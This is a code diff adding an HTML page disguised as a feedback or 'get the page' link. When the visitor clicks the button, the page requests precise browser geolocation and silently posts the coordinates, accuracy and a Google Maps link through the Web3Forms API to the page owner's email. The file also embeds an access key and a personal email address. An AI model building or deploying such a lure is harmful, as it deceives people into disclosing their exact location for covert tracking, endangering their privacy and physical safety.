@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Share Your Location</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 20px;
+      background-color: aqua;
+    }
+    #location-info {
+      margin-top: 20px;
+    }
+    #get-location{
+        size: 20px;
+        color: white;
+        background-color: brown;
+        background-size: 20px;
+    }
+  </style>
+</head>
+<body>
+  <h1>Share Your Feedback</h1>
+  <p>Click the button below get access to a new page:</p>
+  <button id="get-location">Get the page</button>
+  <div id="location-info"></div>
+
+  <script>
+    const button = document.getElementById('get-location');
+    const locationInfo = document.getElementById('location-info');
+
+    button.addEventListener('click', () => {
+      if (navigator.geolocation) {
+        // Requesting high accuracy
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const { latitude, longitude, accuracy } = position.coords;
+            const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}&z=16`; // Adding zoom level for better accuracy
+
+            // Send location using Web3 Forms API
+            fetch('https://api.web3forms.com/submit', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json',
+              },
+              body: JSON.stringify({
+                access_key: '45ff00a5-068c-4065-aaae-c049d40b1da7', // Replace with your Web3 Forms Access Key
+                subject: 'New Location Shared',
+                from_name: 'User Location Form',
+                from_email: 'mpillaisidharth@gmail.com', // Replace with a valid email (used for Web3 Forms verification)
+                message: `Latitude: ${latitude}\nLongitude: ${longitude}\nGoogle Maps Link: ${googleMapsLink}\nAccuracy: ±${accuracy} meters`,
+              }),
+            })
+            .then((response) => {
+              if (response.ok) {
+                locationInfo.innerHTML = `<p>Thank you for visiting!</p>`;
+              } else {
+                locationInfo.innerHTML = `<p style="color: red;">Failed to load. Please try again.</p>`;
+              }
+            })
+            .catch((error) => {
+              locationInfo.innerHTML = `<p style="color: red;">Error: ${error.message}</p>`;
+            });
+
+            // Display the location with accuracy info
+            locationInfo.innerHTML = `
+              <p><strong>Latitude:</strong> ${latitude}</p>
+              <p><strong>Longitude:</strong> ${longitude}</p>
+              <p><strong>Accuracy:</strong> ±${accuracy} meters</p>
+              <p><a href="${googleMapsLink}" target="_blank">View on Google Maps</a></p>
+            `;
+          },
+          (error) => {
+            locationInfo.innerHTML = `<p style="color: red;">Error: ${error.message}</p>`;
+          },
+          {
+            enableHighAccuracy: true, // Requesting high accuracy
+            timeout: 5000, // Time limit in ms
+            maximumAge: 0 // Prevent cached location
+          }
+        );
+      } else {
+        locationInfo.innerHTML = `<p style="color: red;">Geolocation is not supported by your browser.</p>`;
+      }
+    });
+  </script>
+</body>
+</html>
+
+
+
